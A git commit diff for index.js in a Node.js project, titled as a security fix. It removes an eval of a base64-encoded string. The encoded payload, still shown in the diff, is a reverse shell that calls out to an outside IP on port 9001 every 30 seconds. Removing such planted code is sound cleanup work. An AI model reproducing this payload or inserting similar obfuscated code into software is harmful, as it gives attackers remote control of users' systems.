af85a4c0b76d5b66c9ca3454bf3778a4de776dc8
Neev Alex <neevalex@gmail.com>
2026-05-14 16:38:25 +0300

    Remove eval for security improvement
    Removed eval statement that decodes a base64 string.

--- index.js
+++ index.js
@@ -13,7 +13,6 @@ var html;
 
 const { convertArrayToCSV } = require("convert-array-to-csv");
 const converter = require("convert-array-to-csv");
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
 
 db.defaults({ settings: {}, products: [] }).write();
 
